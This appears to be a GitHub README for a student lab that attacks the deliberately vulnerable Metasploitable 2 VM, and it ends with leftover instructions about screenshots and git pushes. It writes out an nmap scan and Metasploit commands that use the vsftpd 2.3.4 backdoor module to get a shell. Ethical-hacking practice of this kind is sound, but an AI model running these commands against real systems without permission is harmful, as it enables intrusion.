# Metasploitable 2 Penetration Testing (Cybersecurity Project)

This project is a simple demonstration of penetration testing techniques using the Metasploitable 2 virtual machine and Kali Linux, based on a tutorial by Loi Liang Yang.

## 📌 Project Objective
To simulate a basic cyberattack on a vulnerable system (Metasploitable 2) in a controlled lab environment and learn core ethical hacking techniques.

## 🎯 Tools & Technologies
•⁠  ⁠Kali Linux
•⁠  ⁠Metasploitable 2 VM
•⁠  ⁠Metasploit Framework
•⁠  ⁠Nmap

## 🔧 Methodology

### 1. Reconnaissance
Used ⁠ nmap ⁠ to identify open ports and services:
⁠ bash
nmap -sS -sV 192.168.1.105

2. Exploitation

Used Metasploit to exploit a known vulnerability.

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.105
exploit

3. Post-Exploitation

Accessed the shell and verified successful entry.

📺 Reference

Tutorial video: YouTube – Loi Liang Yang

⚠️ Disclaimer

This project is for educational purposes only. Always perform penetration testing in a legal and ethical manner with explicit permission.

📄 License

MIT License

---

### 3. **Add Screenshots or Images (Optional)**
- Take screenshots of your terminal or setup
- Save them in a folder (e.g., `/images`)
- Use Markdown to embed them:
 ⁠markdown
![Nmap Scan Result](images/nmap-scan.png)


⸻

4.⁠ ⁠Push Project Files (Optional)

If you have code/scripts or VM configuration files, you can upload them too:

git init
git add .
git commit -m "Initial commit - Metasploitable 2 Project"
git branch -M main
git remote add origin https://github.com/yourusername/metasploitable2-penetration-testing.git
git push -u origin main


